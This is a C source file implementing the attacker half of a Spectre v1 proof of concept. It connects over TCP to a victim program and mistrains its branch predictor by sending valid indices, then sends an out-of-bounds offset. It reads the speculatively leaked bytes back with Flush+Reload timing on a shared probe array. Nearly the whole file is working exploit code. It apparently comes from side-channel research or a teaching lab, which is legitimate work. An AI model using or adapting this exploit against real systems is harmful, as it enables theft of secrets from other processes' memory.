#define _GNU_SOURCE

#include <fcntl.h>
#include <limits.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <x86intrin.h>

#define PAGE_SIZE 512

#include "libmicroarchi.h"

#define SPECTRE_NB_ITER 10000
#define PROBE_ARRAY_SIZE 256
#define NB_CORRECT_VALUES 30

#include <netdb.h>
#include <sys/socket.h>
#define MAX 80
#define PORT 4444
#define SA struct sockaddr

static size_t cache_hit_threshold;

static void train_pht (const size_t byte_offset,
                       size_t* array1_size_ptr,
                       int sockfd)
{
    //Buffer containing malicious value targeting victim memory to be stolen
    
    char malicious_buffer[64];
    memset (malicious_buffer, '\0', 64 * sizeof (char));
    sprintf (malicious_buffer, "%lu", byte_offset);
    malicious_buffer[strlen (malicious_buffer)] = '\n';

    //Buffer containing valid value for victim for training PHT
    
    static int count = 0;
    size_t training_x = count % (*array1_size_ptr);
    char train_buffer[64];
    memset (train_buffer, '\0', 64 * sizeof (char));
    sprintf (train_buffer, "%2lu", training_x);
    train_buffer[2] = '\n';

    //1. Train the victim PHT with correct values
    
    for (int j = 0; j < NB_CORRECT_VALUES; j++) {
        write(sockfd, train_buffer, sizeof(train_buffer));
    }

    //Flush the value used to compare to malicious value, increases chance of executing speculatively
    
    libmicro_flush (array1_size_ptr);
    __asm__("mfence\n");

    //2. Malicious array access, x is outside array and would normally not be accessed, but is accessed speculatively
    
    write(sockfd, malicious_buffer, strlen (malicious_buffer));
    count++;
}

static int read_byte (char* probe_array)
{
    unsigned long timestamp;
    size_t probed_index;
    char junk;
    register unsigned long long time1;
    volatile char* addr;
    size_t scores[PROBE_ARRAY_SIZE];
    memset (scores, '\0', PROBE_ARRAY_SIZE * sizeof (size_t));

    //3. Check the index that has been accessed speculatively using Flush+Reload. Start at 16 because the first 16 indexes of probe_array were accessed when training the PHT
    
    for (int i = 0; i < PROBE_ARRAY_SIZE; i++) {
        probed_index = ((i * 167) + 13) & 255;
        timestamp = libmicro_measure_access_time (probe_array + probed_index * PAGE_SIZE);
        if (timestamp < cache_hit_threshold && probed_index > 16) {
            // LOG ("time for %lu: %lu", probed_index, timestamp); //Extra logging line for debug/verbosity
            scores[probed_index]++;
        }
    }
    
    //Determine max scores from cache line scores

    size_t max = 0;
    int index = -1;
    for (int i = 0; i < PROBE_ARRAY_SIZE; i++) {
        // LOG ("score[%d]=%lu\n", i, scores[i]); //Extra logging line for debug/verbosity
        if (scores[i] > max) {
            max = scores[i];
            index = i;
        }
    }
    return index;
}

int main (int argc, char const* argv[])
{
    //Give attacker higher scheduling priority than victim
    
    nice (1);
    
//beginning of socket creation
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    } 
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));
    
    servaddr.sin_family = AF_INET;
    if (argv[5]){
        servaddr.sin_addr.s_addr = inet_addr(argv[5]);    
    }
    else{
        servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    }
    servaddr.sin_port = htons(PORT);
  
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        printf("connection with the server failed...\n");
        exit(0);
    }
    else
        printf("connected to the server..\n");

//end of socket creation

    if (argc != 5 && argc != 6) {
        ERREXIT (
            "Usage: %s <byte_offset (decimal)> <base_address (hexadecimal)> <probe_array_addr (hexadecimal)> <array1_size_addr (hexadecimal)> <victim_ip_addr>",
            argv[0]);
    }

    //Raise cache_hit_threshold to ensure getting every cache hit
    
    cache_hit_threshold = libmicro_get_cache_hit_threshold () + 20;
    LOG ("ATTACK - Cache hit threshold is %lu cycles", cache_hit_threshold);

    size_t byte_offset = (size_t) strtoll (argv[1], NULL, 10);
    const unsigned long long target_base = strtoull (argv[2], NULL, 16);
    const unsigned long long probe_array_offset = strtoull (argv[3], NULL, 16);
    const unsigned long long array1_size_offset = strtoull (argv[4], NULL, 16);

    void* mapped_addr = libmicro_get_file_handle ("./victim");
    if (mapped_addr == NULL) {
        PERREXIT ("Map victim");
    }

    void* probe_array_ptr = mapped_addr + (probe_array_offset - target_base);
    void* array1_size_ptr = mapped_addr + (array1_size_offset - target_base);

    int spectre_ret;
    size_t nb_bytes = 30;

    int max = 0;
    int scores[256];
    int index;

    //Execute attack

    for (size_t i = 0; i < nb_bytes; i++, byte_offset++) {
        memset (scores, '\x00', 256 * sizeof (int));
        while (1) {
            for (int k = 0; k < SPECTRE_NB_ITER; k++) {
                for (int j = 0; j < PROBE_ARRAY_SIZE; j++) {
                    libmicro_flush (probe_array_ptr + j * PAGE_SIZE);
                }
                train_pht (byte_offset, array1_size_ptr, sockfd);
                spectre_ret = read_byte ((char*) probe_array_ptr);
                if (spectre_ret >= 0 && spectre_ret < 256) {
                    scores[spectre_ret]++;
                }
            }
            max = 0;
            index = -1;
            for (int k = 0; k < 256; k++) {
                if (scores[k] > max) {
                    max = scores[k];
                    index = k;
                }
            }
            if (index != -1) {
                OK ("Found a value: %c (0x%hhx)", (char) index, index);
                break;
            }
        }
    }

    // close the socket
    close(sockfd);

    return EXIT_SUCCESS;
}
